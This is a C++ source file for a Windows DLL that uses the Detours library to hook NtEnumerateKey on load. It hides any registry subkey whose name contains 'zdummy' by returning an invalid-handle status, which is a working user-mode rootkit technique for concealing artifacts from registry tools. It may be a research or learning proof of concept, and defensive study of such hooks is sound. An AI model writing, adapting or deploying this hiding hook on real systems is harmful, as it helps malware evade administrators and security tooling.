// dllmain.cpp : Defines the entry point for the DLL application.

#include "pch.h"
#include <Windows.h>
#include <winternl.h>
#include <winevt.h>
#include <winreg.h>
#include "detours.h"
#include <string>

#define STATUS_INVALID_HANDLE (0xC0000008)

typedef struct _KEY_BASIC_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG         TitleIndex;
    ULONG         NameLength;
    WCHAR         Name[1];
} KEY_BASIC_INFORMATION, * PKEY_BASIC_INFORMATION;

typedef enum class _KEY_INFORMATION_CLASS {
    KeyBasicInformation,
    KeyNodeInformation,
    KeyFullInformation,
    KeyNameInformation,
    KeyCachedInformation,
    KeyFlagsInformation,
    KeyVirtualizationInformation,
    KeyHandleTagsInformation,
    KeyTrustInformation,
    KeyLayerInformation,
    MaxKeyInfoClass
} KEY_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* realNtEnumerateKey)(
    HANDLE                      KeyHandle,
    ULONG                       Index,
    KEY_INFORMATION_CLASS KeyValueInformationClass,
    PVOID                       KeyValueInformation,
    ULONG                       Length,
    PULONG                      ResultLength);

realNtEnumerateKey _realNtEnumerateKey = (realNtEnumerateKey)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtEnumerateKey");


NTSTATUS _ntEnumerateKey(
    IN HANDLE               KeyHandle,
    IN ULONG                Index,
    IN KEY_INFORMATION_CLASS KeyInformationClass,
    OUT PVOID               KeyInformation,
    IN ULONG                Length,
    OUT PULONG              ResultLength) {


    NTSTATUS status = _realNtEnumerateKey(KeyHandle, Index , KeyInformationClass, KeyInformation, Length, ResultLength);

    switch (KeyInformationClass)
    {
        case KEY_INFORMATION_CLASS::KeyBasicInformation:
        {
            PKEY_BASIC_INFORMATION information = (PKEY_BASIC_INFORMATION)KeyInformation;
            if (wcsstr(information->Name, L"zdummy") != 0) {
                return STATUS_INVALID_HANDLE;
            }
           
        }
    }

    return status;
}


void attachDetours() {

    RegDisablePredefinedCache();
    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    DetourAttach((PVOID*)&_realNtEnumerateKey, _ntEnumerateKey);

    DetourTransactionCommit();
}

void deAttachDetours() {

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    DetourDetach((PVOID*)&_realNtEnumerateKey, _ntEnumerateKey);

    DetourTransactionCommit();
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        attachDetours();
        break;
    case DLL_PROCESS_DETACH:
        deAttachDetours();
        break;
    }
    return TRUE;
}
